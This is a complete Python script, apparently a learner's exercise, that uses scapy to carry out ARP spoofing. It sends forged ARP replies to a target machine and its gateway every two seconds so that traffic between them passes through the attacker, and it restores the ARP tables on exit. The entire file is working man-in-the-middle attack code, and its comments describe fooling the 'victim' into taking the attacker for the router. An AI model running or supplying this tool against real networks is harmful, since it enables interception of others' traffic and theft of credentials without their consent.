import scapy.all as scapy
import argparse
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Specify the target IP")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Specify the gateway IP")
    arguments = parser.parse_args()
    if not arguments.target_ip:
        parser.error("Please specify a target ip")
    elif not arguments.gateway_ip:
        parser.error("Please specify a gateway ip")
    else:
        return arguments


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc  # [0] to get the first element, [1] to get the mac


def spoof(target_ip, spoof_ip):
    # this packet will fool the target victim into thinking that we are the router
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip) # pdst=destination ip, hwdst=destination mac address, psrc=packet source, scapy automatically puts my computer's mac address as the source mac address
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())


arguments = get_arguments()
windows_ip = arguments.target_ip
router_ip = arguments.gateway_ip

sent_packets_count = 0
try:
    while True:
        spoof(windows_ip, router_ip)  # telling victim im the router
        spoof(router_ip, windows_ip)  # telling router im the victim
        sent_packets_count += 2
        print("\r[+] Package sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Quitting.")
    restore(windows_ip, router_ip)
    restore(router_ip, windows_ip)
    print("[+] Process terminated.")
